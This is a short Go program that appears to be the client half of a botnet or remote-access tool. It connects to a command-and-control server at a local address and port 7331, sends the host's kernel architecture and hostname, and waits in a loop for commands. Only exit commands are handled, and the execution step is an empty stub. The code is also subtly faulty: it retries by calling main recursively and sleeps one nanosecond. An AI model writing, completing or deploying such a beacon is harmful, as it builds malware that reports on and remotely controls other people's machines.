package main

// Imports
import (
	"fmt"
	"github.com/shirou/gopsutil/host"
	"net"
	"strings"
	"time"
)


func main() {
	Host := "127.0.0.1"
	Port := 7331

	// Connect to CNC
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", Host, Port))
	if err != nil { fmt.Println(err); time.Sleep(1); main() }

	// Send System Architechture and Hostname to CNC
	hostStat, _ := host.Info()
	arch := hostStat.KernelArch
	conn.Write([]byte(arch))
	conn.Write([]byte(hostStat.Hostname))

	// Wait for commands
	for {
		// Read Command
		// ===
		var buffer [1024]byte
		n, err := conn.Read(buffer[0:])
		if err != nil { fmt.Println(err) }

		line := strings.TrimSpace(string(buffer[0:n]))
		// ===

		// Execute Command
		if line == "exit" || line == "quit" || line == ".q" {
			fmt.Println("Killed")
			return
		}
	}

}
